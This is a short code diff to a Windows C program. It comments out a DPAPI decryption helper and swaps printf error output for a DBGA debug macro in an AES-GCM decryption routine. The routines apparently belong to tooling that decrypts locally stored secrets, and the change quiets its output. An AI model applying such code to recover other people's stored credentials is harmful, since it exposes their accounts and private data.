@@ -703,6 +703,7 @@ PBYTE Base64Decode(IN LPCSTR pszInput, IN DWORD cbInput, OUT PDWORD pcbOutput)
     return pbOutput;
 }
 
+/*
 static BOOL DecryptDpapiBlob(IN PBYTE pBlob, IN DWORD dwBlob, OUT PBYTE* ppDecrypted, OUT PDWORD pcbDecrypted)
 {
     DATA_BLOB   blobIn      = { 0 };
@@ -728,6 +729,7 @@ static BOOL DecryptDpapiBlob(IN PBYTE pBlob, IN DWORD dwBlob, OUT PBYTE* ppDecry
 
     return TRUE;
 }
+*/
 
 static BOOL DecryptAesGcm(IN PBYTE pbKey, IN ULONG cbKey, IN PBYTE pbIv, IN ULONG cbIv, IN PBYTE pbCiphertext, IN ULONG cbCiphertext, IN PBYTE pbTag, IN ULONG cbTag, OUT PBYTE* ppbPlaintext, OUT PDWORD pcbPlaintext)
 {
@@ -745,19 +747,19 @@ static BOOL DecryptAesGcm(IN PBYTE pbKey, IN ULONG cbKey, IN PBYTE pbIv, IN ULON
 
     if ((ntStatus = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)) != 0)
     {
-        printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%08X\n", ntStatus);
+        DBGA("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%08X", ntStatus);
         goto _END_OF_FUNC;
     }
 
     if ((ntStatus = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0)) != 0)
     {
-        printf("[!] BCryptSetProperty Failed With Error: 0x%08X\n", ntStatus);
+        DBGA("[!] BCryptSetProperty Failed With Error: 0x%08X", ntStatus);
         goto _END_OF_FUNC;
     }
 
     if ((ntStatus = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pbKey, cbKey, 0)) != 0)
     {
-        printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%08X\n", ntStatus);
+        DBGA("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%08X", ntStatus);
         goto _END_OF_FUNC;
     }
 
@@ -771,13 +773,13 @@ static BOOL DecryptAesGcm(IN PBYTE pbKey, IN ULONG cbKey, IN PBYTE pbIv, IN ULON
 
     if (!(pbPlaintext = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPlaintext + 1)))
     {
-        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
+        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
         goto _END_OF_FUNC;
     }
 
     if ((ntStatus = BCryptDecrypt(hKey, pbCiphertext, cbCiphertext, &AuthInfo, NULL, 0, pbPlaintext, dwPlaintext, &cbResult, 0)) != 0)
     {
-        printf("[!] BCryptDecrypt Failed With Error: 0x%08X\n", ntStatus);
+        DBGA("[!] BCryptDecrypt Failed With Error: 0x%08X", ntStatus);
         goto _END_OF_FUNC;
     }
 
